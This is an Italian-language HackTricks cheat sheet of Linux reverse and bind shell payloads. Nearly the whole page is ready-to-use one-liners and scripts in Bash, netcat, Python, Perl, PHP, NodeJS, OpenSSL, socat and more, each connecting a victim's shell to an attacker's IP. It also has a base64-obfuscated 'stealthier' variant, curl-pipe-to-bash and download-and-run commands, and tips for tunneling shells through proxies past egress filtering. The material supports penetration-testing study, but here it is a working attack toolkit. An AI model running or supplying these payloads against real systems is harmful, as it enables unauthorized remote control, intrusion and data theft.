# Shell - Linux

{{#include ../../banners/hacktricks-training.md}}

**Se hai domande su una di queste shell, puoi verificarla su** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>

## Full TTY

**Una volta ottenuta una reverse shell,**[ **leggi questa pagina per ottenere una Full TTY**](full-ttys.md)**.**

I payload di reverse shell di base raccolti di seguito sono documentati anche nei cheat sheet di HighOn.Coffee e PayloadsAllTheThings; verifica la disponibilità dell’interprete e delle utility sul target prima di sceglierne uno.<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```

Non dimenticare di verificare anche con altre shell: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh e bash.

### Shell sicura per i simboli

```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```

#### Spiegazione della shell

I punti seguenti riassumono il comportamento documentato di Bash in modalità interattiva e per il reindirizzamento:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: Questa parte del comando avvia una shell Bash interattiva (`-i`).
2. **`>&`**: Questa parte del comando è una notazione abbreviata per **reindirizzare sia lo standard output** (`stdout`) sia **lo standard error** (`stderr`) verso la **stessa destinazione**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: È un file speciale che **rappresenta una connessione TCP all'indirizzo IP e alla porta specificati**.
   - **Reindirizzando i flussi di output ed errori verso questo file**, il comando invia di fatto l'output della sessione di shell interattiva alla macchina dell'attaccante.
4. **`0>&1`**: Questa parte del comando **reindirizza lo standard input (`stdin`) verso la stessa destinazione dello standard output (`stdout`)**.

### Creare un file ed eseguirlo

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

## Forward Shell

Quando è disponibile una RCE ma una reverse shell è bloccata da un firewall, dal NAT o dal filtraggio del traffico in uscita, una forward shell tramite il canale RCE può fornire una sessione semi-interattiva.<sup>[[12]](#references)</sup>

Uno strumento consigliato a questo scopo è [toboggan](https://github.com/n3rada/toboggan.git), che avvolge una primitiva di esecuzione dei comandi in una sessione interattiva.<sup>[[12]](#references)</sup>

Per usare toboggan, crea un modulo Python adatto al contesto RCE del sistema target; l'interfaccia del modulo prevede una funzione `execute(command, timeout)` che restituisce l'output dei comandi.<sup>[[12]](#references)</sup> Per esempio, un modulo chiamato `nix.py` potrebbe essere strutturato come segue:

```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
    token = jwt.encode(
        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
    )

    response = httpx.get(
        url="https://vulnerable.io:3200",
        headers={"Authorization": f"Bearer {token}"},
        timeout=timeout,
        # ||BURP||
        verify=False,
    )

    # Check if the request was successful
    response.raise_for_status()

    return response.text
```

Esegui il modulo usando la sintassi attuale della riga di comando di toboggan:<sup>[[12]](#references)</sup>

```shell
toboggan nix.py
```

Questo avvia la sessione interattiva. Per il backend integrato di Burp Suite, usa `toboggan --request burp_request.xml`; per un backend con wrapper di comandi, usa `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>

Un’altra possibilità è l’implementazione forward-shell di `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>

Devi modificare le seguenti parti:<sup>[[13]](#references)</sup>

- L’URL dell’host vulnerabile
- Il prefisso e il suffisso del payload (se presenti)
- Il modo in cui viene inviato il payload (header? dati? informazioni aggiuntive?)

Poi puoi **inviare comandi** o usare il **comando `upgrade`** per ottenere una PTY completa; l’implementazione controlla l’output a intervalli di circa 1,3 secondi.<sup>[[13]](#references)</sup>

## Netcat

```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## BusyBox

BusyBox combina molte utility in un unico eseguibile di piccole dimensioni ed è comune nei sistemi Linux piccoli o embedded. Se non è disponibile un `nc` autonomo, verifica se BusyBox lo include:<sup>[[8]](#references)[[19]](#references)</sup>

```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```

Se `busybox nc` è presente ma l'esecuzione interattiva è instabile, adatta il pattern FIFO della sezione `nc` a quell'applet:<sup>[[2]](#references)[[8]](#references)</sup>

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```

## gsocket

Consulta le istruzioni ufficiali per la distribuzione all'indirizzo [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>

```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```

## Telnet

```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## Whois

**Attaccante**

```bash
while true; do nc -l <port>; done
```

Usa la stessa sequenza di input Enter/CTRL+D descritta nella sezione Whois.<sup>[[3]](#references)</sup>

**Vittima**

```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```

## Python

```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## Perl

```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PHP

```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Ncat

```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```

### Tramite un proxy outbound esplicito

Se il target può raggiungere un proxy HTTP `CONNECT` o SOCKS ma non può aprire una connessione TCP diretta al listener, usa **Ncat** in modalità connect. Il proxy deve consentire un tunnel verso l'host e la porta del listener; `CONNECT` inoltra i byte solo dopo la configurazione, quindi una shell semplice **non** è traffico HTTP né è cifrata solo perché usa un proxy HTTP.<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>

```bash
# Attacker: expose a listener reachable from the proxy
ncat -l 443

# Target: HTTP CONNECT proxy (default proxy type)
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type http --exec "/bin/sh -i" <ATTACKER_HOST> 443

# Target: use this instead for a SOCKS5 proxy
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type socks5 --exec "/bin/sh -i" <ATTACKER_HOST> 443
```

Per un proxy autenticato, Ncat accetta `--proxy-auth` o `NCAT_PROXY_AUTH` (quest’ultimo evita di inserire le credenziali negli argomenti del comando).<sup>[[23]](#references)</sup> Per impostazione predefinita, i nomi host di destinazione vengono risolti dal proxy; usa `--proxy-dns local` solo quando è necessaria la risoluzione locale.<sup>[[23]](#references)</sup> Se il proxy impone TLS o protocolli applicativi oltre a `CONNECT`, usa un trasporto cifrato appropriato invece di presumere che la porta 443 mascheri una shell raw; consulta [tunneling and port forwarding](../tunneling-and-port-forwarding.md) per il trasporto basato su WebSocket.<sup>[[22]](#references)[[24]](#references)</sup>

## Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Lua

```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

## Zsh (TCP integrato)

```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```

## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener moderno simile a netcat, scritto in Rust.<sup>[[5]](#references)</sup>

```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
  && chmod +x /tmp/rcat \
  && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```

Funzionalità documentate dal progetto:<sup>[[5]](#references)</sup>
- Cronologia dei comandi e completamento con tab nella modalità interattiva
- `-s` per selezionare l'eseguibile della shell usato da `connect`

## pwncat-cs

Se hai già **una qualsiasi reverse shell raw** ma vuoi un listener in grado di configurare una sessione più utilizzabile, `pwncat-cs` può gestire la connessione e tentare di aprire una PTY remota.<sup>[[7]](#references)</sup>

```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

Supporta anche canali `ssl-bind` e `ssl-connect` **crittografati**, quindi puoi combinarlo con payload `ncat --ssl` o `socat OPENSSL:` quando hai bisogno della crittografia del trasporto.<sup>[[7]](#references)</sup>

## revsh (crittografato e pivot-ready)

`revsh` è un piccolo client/server C che fornisce una TTY completa tramite un **tunnel Diffie-Hellman crittografato** e può collegarsi facoltativamente a un'interfaccia **TUN/TAP** per il pivoting tramite VPN inversa.<sup>[[6]](#references)</sup>

```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```

Flag utili documentati da `revsh` includono:<sup>[[6]](#references)</sup>
- `-b`: modalità bind-shell (abilitala su entrambe le estremità)
- `-D [LHOST:]LPORT` o `-B [RHOST:]RPORT`: forwarding dinamico SOCKS 4/4a/5
- `-x`: disabilita la configurazione automatica dei proxy, inclusa la configurazione predefinita di TUN/TAP

Il tunnel crittografato evita di esporre il traffico della shell in testo in chiaro, ma da solo non aggira le policy di rete.<sup>[[6]](#references)</sup>

## OpenSSL

Questa sezione usa i comandi `req`, `s_server` e `s_client` di OpenSSL per creare un certificato e trasportare una shell su TLS.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

L'attaccante (Kali)

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```

La vittima

```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```

Puoi comunque usare il classico pattern a due listener quando vuoi canali di input/output separati.<sup>[[16]](#references)[[17]](#references)</sup>

```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Finger

**Attaccante**

```bash
while true; do nc -l 79; done
```

Per inviare il comando, scrivilo, premi Invio e premi CTRL+D (per interrompere STDIN).<sup>[[3]](#references)</sup>

**Vittima**

```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```

## Gawk

```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Xterm

Questo tenterà di connettersi al tuo sistema sulla porta 6001.<sup>[[2]](#references)</sup>

```bash
xterm -display 10.0.0.1:1
```

Per ricevere la reverse shell, usa un server X in ascolto sulla porta 6001, come mostrato di seguito.<sup>[[2]](#references)</sup>

```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```

## Groovy

di [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). NOTA: la reverse shell Java funziona anche con Groovy.<sup>[[18]](#references)</sup>

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## References

- [1] [Cheat sheet per Reverse Shell: PHP, ASP, Netcat, Bash e Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Cheat sheet per Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Uso di Whois e Finger per le Reverse Shell](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Cheat sheet per Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - Il listener di porte moderno e reverse shell](https://github.com/robiot/rustcat)
- [6] [revsh - Una reverse shell con supporto per terminale, tunneling dei dati e funzionalità avanzate di pivoting](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - Piattaforma di post-exploitation](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Manuale di riferimento di Bash: Reindirizzamenti](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Manuale di riferimento di Bash: Avvio di Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Istruzioni per la distribuzione di Global Socket](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [Reverse Shell pura in Groovy/Java](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
- [20] [Uso di Ncat come proxy](https://nmap.org/ncat/guide/ncat-proxy.html)
- [21] [Esecuzione di comandi con Ncat](https://nmap.org/ncat/guide/ncat-exec.html)
- [22] [RFC 9110: CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6)
- [23] [Guida di riferimento di Ncat](https://nmap.org/book/ncat-man.html)
- [24] [README di wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../../banners/hacktricks-training.md}}
